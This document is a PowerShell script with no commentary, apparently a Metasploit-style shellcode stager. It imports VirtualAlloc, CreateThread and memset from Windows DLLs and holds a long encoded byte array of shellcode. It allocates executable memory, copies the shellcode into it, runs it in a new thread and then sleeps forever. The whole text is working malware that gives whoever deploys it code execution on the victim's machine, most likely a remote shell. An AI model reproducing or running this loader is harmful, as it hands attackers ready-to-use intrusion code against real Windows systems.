$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x87,0xd0,0xbe,0xa7,0xdb,0xc1,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x5a,0x31,0x7a,0x12,0x83,0xea,0xfc,0x03,0xfd,0xde,0x5c,0x52,0xfd,0x37,0x22,0x9d,0xfd,0xc7,0x43,0x17,0x18,0xf6,0x43,0x43,0x69,0xa9,0x73,0x07,0x3f,0x46,0xff,0x45,0xab,0xdd,0x8d,0x41,0xdc,0x56,0x3b,0xb4,0xd3,0x67,0x10,0x84,0x72,0xe4,0x6b,0xd9,0x54,0xd5,0xa3,0x2c,0x95,0x12,0xd9,0xdd,0xc7,0xcb,0x95,0x70,0xf7,0x78,0xe3,0x48,0x7c,0x32,0xe5,0xc8,0x61,0x83,0x04,0xf8,0x34,0x9f,0x5e,0xda,0xb7,0x4c,0xeb,0x53,0xaf,0x91,0xd6,0x2a,0x44,0x61,0xac,0xac,0x8c,0xbb,0x4d,0x02,0xf1,0x73,0xbc,0x5a,0x36,0xb3,0x5f,0x29,0x4e,0xc7,0xe2,0x2a,0x95,0xb5,0x38,0xbe,0x0d,0x1d,0xca,0x18,0xe9,0x9f,0x1f,0xfe,0x7a,0x93,0xd4,0x74,0x24,0xb0,0xeb,0x59,0x5f,0xcc,0x60,0x5c,0x8f,0x44,0x32,0x7b,0x0b,0x0c,0xe0,0xe2,0x0a,0xe8,0x47,0x1a,0x4c,0x53,0x37,0xbe,0x07,0x7e,0x2c,0xb3,0x4a,0x17,0x81,0xfe,0x74,0xe7,0x8d,0x89,0x07,0xd5,0x12,0x22,0x8f,0x55,0xda,0xec,0x48,0x99,0xf1,0x49,0xc6,0x64,0xfa,0xa9,0xcf,0xa2,0xae,0xf9,0x67,0x02,0xcf,0x91,0x77,0xab,0x1a,0x35,0x27,0x03,0xf5,0xf6,0x97,0xe3,0xa5,0x9e,0xfd,0xeb,0x9a,0xbf,0xfe,0x21,0xb3,0xa8,0x40,0xca,0xbc,0x28,0x36,0xab,0xd2,0x4c,0xd7,0x1e,0x1b,0xa3,0x73,0x05,0x35,0xc8,0x55,0xab,0xac,0x5a,0xa9,0x6b,0x77,0xfb,0xf1,0xd3,0xdf,0xa3,0x59,0xbc,0x87,0x0b,0x01,0x64,0x60,0xf4,0xe9,0xcc,0xc8,0x5c,0x51,0xb5,0xb0,0x04,0x39,0x1d,0x19,0xed,0xe1,0xc5,0xc1,0x55,0x49,0xae,0xa9,0x3d,0x31,0x16,0x12,0xe6,0x99,0xfe,0xfa,0x4e,0x41,0xa7,0xa2,0x6e,0x19,0xfe,0x7b,0x5b,0x59,0xff,0xa9,0x28,0x19,0x1c,0x38,0x2a,0xc9,0x74,0xbe,0x34,0xf8,0xd8,0x37,0xd2,0x90,0xf0,0x11,0x4c,0x0c,0x68,0x38,0x06,0xad,0x75,0x96,0x62,0xed,0xfe,0x15,0x92,0xa3,0xf6,0x50,0x80,0x53,0xf7,0x2e,0xfa,0xf5,0x08,0x85,0x91,0xf9,0x9c,0x22,0x30,0xae,0x08,0x29,0x65,0x98,0x96,0xd2,0x40,0x93,0x1f,0x47,0x2b,0xcb,0x5f,0x87,0xab,0x0b,0x36,0xcd,0xab,0x63,0xee,0xb5,0xff,0x96,0xf1,0x63,0x6c,0x0b,0x64,0x8c,0xc5,0xf8,0x2f,0xe4,0xeb,0x27,0x07,0xab,0x14,0x02,0x99,0x97,0xc2,0x6a,0xef,0xf9,0xd6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};